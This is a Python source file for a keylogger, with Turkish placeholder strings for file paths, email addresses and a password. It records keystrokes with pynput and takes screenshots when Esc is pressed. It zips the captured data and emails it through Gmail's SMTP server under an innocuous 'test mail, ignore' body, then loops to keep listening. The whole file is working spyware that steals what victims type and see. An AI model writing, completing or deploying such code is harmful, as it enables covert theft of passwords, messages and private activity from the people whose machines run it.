import smtplib
import mimetypes
import pyautogui
import zipfile
import time
from email.message import EmailMessage
from pynput.keyboard import Key, Listener


count = 0
keys = []


def on_press(key):
    global count, keys
    count += 1
    print("{0} pressed".format(key))
    keys.append(key)
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(
        "Pc de txt'nin olusacagi adres", "a", encoding="utf-8"
    ) as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    if key == Key.esc:
        print("Exit...")
        ScShot()
        #return False


def ScShot():
    for i in range(5):
        pyautogui.screenshot("SS'in kaydedilecegi adres/{0}.jpg".format(i))
        time.sleep(0.7)
    Create_Zip()


def Yolla():
    while True:
        Sender()
        First()


def Create_Zip():
    # time.sleep(1)
    with zipfile.ZipFile("Pc de dosyanin olusacagi adres", "w") as z:
        z.write("Pc de dosyanin olusacagi adres/txt dosyasinin adresi-example.txt")
        for i in range(5):
            z.write("Pc de dosyanin olusacagi adres/{0}.jpg".format(i))
    Yolla()


def Sender():
    message = EmailMessage()
    sender = "dosyanin gonderilecegi mail adresi"
    recipient = "dosyanin gidecegi mail adresi"
    message["From"] = sender
    message["To"] = recipient
    message["Subject"] = "Example"
    body = "Bu Bir Deneme Mailidir. Dikkate Almayiniz..."
    message.set_content(body)
    print(message)
    mime_type, _ = mimetypes.guess_type("Example.zip")
    print(mime_type)
    mime_type, mime_subtype = mime_type.split("/")

    with open("mail gonderilecek dosyanin adresi/dosyanin adi ve uzantisi-Example.zip", "rb") as file:
        message.add_attachment(
            file.read(),
            maintype=mime_type,
            subtype=mime_subtype,
            filename="mail gonderilecek dosyanin adresi/dosyanin adi ve uzantisi-Example.zip",
        )
    print(message)

    mail_server = smtplib.SMTP_SSL("smtp.gmail.com")
    mail_server.login(sender, "gonderilecek mailin sifresi")
    mail_server.set_debuglevel(1)
    mail_server.send_message(message)
    mail_server.quit()

def First():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

First()
